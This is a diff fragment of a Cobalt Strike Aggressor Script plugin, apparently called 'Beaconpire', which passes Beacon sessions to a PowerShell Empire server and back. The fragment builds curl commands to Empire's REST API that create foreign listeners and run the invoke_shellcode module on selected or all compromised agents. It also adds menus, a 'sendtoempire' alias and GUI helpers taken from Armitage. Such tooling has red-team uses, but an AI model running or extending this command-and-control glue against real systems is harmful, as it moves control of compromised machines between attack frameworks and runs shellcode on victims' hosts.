+						$options = '{"Name":"' . $foreignlistenername . '","Type":"meter","Port":"' . $cobalt_listener['port'] . '","Host":"http://' . $cobalt_listener['host'] . ':' . $cobalt_listener['port'] . '"}';
+					}
+					@command = @('curl', "--insecure", "-i", '-H', 'Content-Type: application/json', 'https://' . %empireserverSettings["ip"] . ":" . %empireserverSettings["port"] . "/api/listeners?token=" . %empireserverSettings["token"], '-X POST', '-d', $options);
+					$curl_command = exec(@command);
+					@create_listener_response = readAll($curl_command);
+					closef($curl_command);
+					checkError(@create_listener_response);
+					if ('"success": false' isin @create_listener_response) {
+						sub extractlistenererror {
+							if ('"msg": ' isin $1) {
+								$error_mesg = split(": ",$1,)[1];
+								$error_mesg = substr($error_mesg, 0, int(strlen($error_mesg)) - 2 );
+								show_error("The following error occurred:\n $error_mesg");
+							}
+						}
+						search(@create_listener_response, &extractlistenererror);
+						break;
+					}
+				}
+				if (@selected_agents eq 'all') {
+					@command = @('curl', "--insecure", "-i", '-H', 'Content-Type: application/json', 'https://' . %empireserverSettings["ip"] . ":" . %empireserverSettings["port"] . "/api/modules/code_execution/invoke_shellcode?token=" . %empireserverSettings["token"], '-X POST', '-d', '{"Listener":"' . $foreignlistenername . '","Agent":"all"}');
+					$curl_command = exec(@command);
+					@create_listener_response = readAll($curl_command);
+					closef($curl_command);
+					checkError(@create_listener_response);
+					if ('"success": false' isin @create_listener_response) {
+						sub extractlistenererror {
+							if ('"msg": ' isin $1) {
+								$error_mesg = split(": ",$1,)[1];
+								$error_mesg = substr($error_mesg, 0, int(strlen($error_mesg)) - 2 );
+								show_error("The following error occurred:\n $error_mesg");
+							}
+						}
+						search(@create_listener_response, &extractlistenererror);
+					}
+				}
+				else {
+					foreach $agent_id (@selected_agents) {
+						#HTML encode spaces to avoid errors when handling agent IDs with spaces
+						$agent_id = strrep($agent_id," ","%20");
+						@command = @('curl', "--insecure", "-i", '-H', 'Content-Type: application/json', 'https://' . %empireserverSettings["ip"] . ":" . %empireserverSettings["port"] . "/api/modules/code_execution/invoke_shellcode?token=" . %empireserverSettings["token"], '-X POST', '-d', '{"Listener":"' . $foreignlistenername . '","Agent":"' . $agent_id . '"}');
+						$curl_command = exec(@command);
+						@create_listener_response = readAll($curl_command);
+						closef($curl_command);
+						checkError(@create_listener_response);
+						if ('"success": false' isin @create_listener_response) {
+							sub extractlistenererror {
+								if ('"msg": ' isin $1) {
+									$error_mesg = split(": ",$1,)[1];
+									$error_mesg = substr($error_mesg, 0, int(strlen($error_mesg)) - 2 );
+									show_error("The following error occurred:\n $error_mesg");
+								}
+							}
+							search(@create_listener_response, &extractlistenererror);
+						}
+					}
+				}
+
+	}, @selected_agents => @selected_agents));
+	$error_mesg = "";
+    [$agentconfigure_dialog setVisible: 0]; # close the dialog off
+}
+
+#menubar options
+menubar("Beaconpire", "beaconpiremenu", 2);
+
+# modify the main "Attacks" menu
+popup beaconpiremenu {
+    item "Configure Server" {
+        configureServer();
+    }
+    item "Configure Empire Listeners" {
+        configureListeners();
+    }
+	item "Send Beacons to Empire" {
+    	beaconsMenu();
+    }
+    item "Pull in Empire Agents" {
+    	agentsMenu();
+    }
+}
+
+#context menu building
+popup beacon_bottom {
+	item "Send to Empire" {
+			$select_bool = "True";
+			clear(%empireserverAttributes["targetbeacons"]);
+			foreach $beacon ($1) {
+				add(%empireserverAttributes["targetbeacons"],$beacon);
+			}
+			configureListeners(%empireserverAttributes["targetbeacons"]);
+	}
+}
+
+#register help
+beacon_command_register("sendtoempire", "send current Beacon session to configured Empire server",
+	"Synopsis: sendtoempire\n\n" .
+	"Sends the current Beacon session to the configured Empire server via the PowerShell launcher.");
+
+#setting the alias
+alias sendtoempire {
+	$select_bool = "True";
+	clear(%empireserverAttributes["targetbeacons"]);
+	add(%empireserverAttributes["targetbeacons"],$1);
+	configureListeners(%empireserverAttributes["targetbeacons"]);
+}
+
+###################################################
+#
+# GUI Helper Methods
+#   these are all from armitage/scripts/gui.sl
+#
+###################################################
+# creates a list dialog, from armitage/scripts/gui.sl
+# $1 = title, $2 = button text, $3 = columns, $4 = rows, $5 = callback
+
+sub quickListDialog {
+    local('$dialog $panel $table $row $model $button $sorter $after $a $tablef');
+    $dialog = dialog($1, $width, $height);
+    $panel = [new JPanel];
+    [$panel setLayout: [new BorderLayout]];
+    
+    ($table, $model) = setupTable($3[0], sublist($3, 1), $4);
+    [$panel add: [new JScrollPane: $table], [BorderLayout CENTER]];
+
+    if ($tablef !is $null) {
+        [$tablef: $table, $model];
+    }
+    
+    $button = [new JButton: $2];
+    [$button addActionListener: lambda({
+        [$callback : [$model getSelectedValueFromColumn: $table, $lead], $table, $model]; 
+        [$dialog setVisible: 0];
+    }, \$dialog, $callback => $5, \$model, \$table, $lead => $3[0])];
+
+    local('$south');
+    $south = [new JPanel];
+        [$south setLayout: [new BoxLayout: $south, [BoxLayout Y_AXIS]]];
+
+    if ($after !is $null) {
+        foreach $a ($after) {
+            [$south add: $a];
+        }
+    }
+    [$south add: center($button)];
+
+    [$panel add: $south, [BorderLayout SOUTH]];
+    [$dialog add: $panel, [BorderLayout CENTER]];
+    [$dialog show];
+    [$dialog setVisible: 1];
+}
+
+# from armitage/scripts/gui.sl
+sub setupTable {
+    local('$table $model $sorter $row $index $col');
+    $model = [new GenericTableModel: $2, $1, 8];
+    foreach $row ($3) {
+        [$model _addEntry: $row];
+        }
+
+    $table = [new ATable: $model];
+    [[$table getSelectionModel] setSelectionMode: [ListSelectionModel SINGLE_SELECTION]];
+    $sorter = [new TableRowSorter: $model];
+    [$table setRowSorter: $sorter];
+
+    # make sure our columns have sorters that make sense
+    foreach $index => $col ($2) {
+        if ($col eq "session_host" || $col eq "host" || $col eq "Host") {
+            [$sorter setComparator: $index, &compareHosts];
+        }
+        else if ($col eq "port" || $col eq "sid" || $col eq "Port") {
+            [$sorter setComparator: $index, { return $1 <=> $2; }];
+        }
+    }
+    
+    return @($table, $model);
+}
+
+# from armitage/scripts/gui.sl
+sub center {
+    local('$panel $c');
+    $panel = [new JPanel];
+    [$panel setLayout: [new FlowLayout: [FlowLayout CENTER]]];
+
+    foreach $c (@_) {
+        [$panel add: $c];
+    }
+
+    return $panel;
+}
+
+# from armitage/scripts/gui.sl
+sub left {
+    local('$panel $c');
+    $panel = [new JPanel];
+    [$panel setLayout: [new FlowLayout: [FlowLayout LEFT]]];
+
+    foreach $c (@_) {
+        [$panel add: $c];
+    }
+
+    return $panel;
+}
+
+# from armitage/scripts/gui.sl
+sub syncTable {
+    if ([$1 isEditing]) {
+        [[$1 getCellEditor] stopCellEditing];
+    }
+}
+
+# helper, from armitage/scripts/gui.sl
+sub dialog {
+    local('$dialog');
+        $dialog = [new JDialog: $__frame__, $1];
+        [$dialog setSize: $2, $3];
+        [$dialog setLayout: [new BorderLayout]];
+        [$dialog setLocationRelativeTo: $__frame__];
+    return $dialog;
+}
+
+# helpers, from armitage/scripts/gui.sl
+sub tableRenderer {
+    return [ATable getDefaultTableRenderer: $1, $2];
+}
